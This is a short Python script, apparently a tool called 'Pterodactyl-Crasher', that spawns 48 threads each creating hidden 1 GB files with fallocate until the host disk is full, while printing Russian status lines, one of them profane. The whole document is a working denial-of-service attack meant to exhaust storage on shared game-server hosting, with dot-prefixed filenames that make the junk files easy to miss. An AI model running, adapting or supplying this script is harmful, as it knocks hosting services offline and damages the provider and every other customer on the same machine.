import concurrent.futures
import subprocess
import threading
import uuid
from time import sleep
import os

megabytes = 0
curr = 0


def allocate_space():
    global megabytes, curr
    while True:
        try:
            target = f".___tmp_{uuid.uuid4()}"
            subprocess.run(["fallocate", "-l", "1G", target], check=True)
            curr += 1
            megabytes += 1
        except subprocess.CalledProcessError as e:
            print("Нету места на хосте, ")
            break
        except Exception as e:
            pass


def display_status():
    global megabytes, curr
    displays = 0
    try:
        while True:
            sleep(0.1)
            displays += 1
            print(f"Закачал всего [ {megabytes} ГБ ] со скоростью [ {curr} Гб/с ]")
            if displays % 10 == 0:
                curr = 0
    except Exception as e:
        print(e)


def main():
    print("github.com/xdearboy/Pterodactyl-Crasher \n\nPterodactyl-Crasher")
    print("Режим: забивка всей памяти")
    print("Подготовка..")

    with concurrent.futures.ThreadPoolExecutor(max_workers=48) as executor:
        for _ in range(48):
            executor.submit(allocate_space)

    print("Ебанный рот, погнали нахуй!")
    status_thread = threading.Thread(target=display_status)
    status_thread.start()


if __name__ == "__main__":
    main()
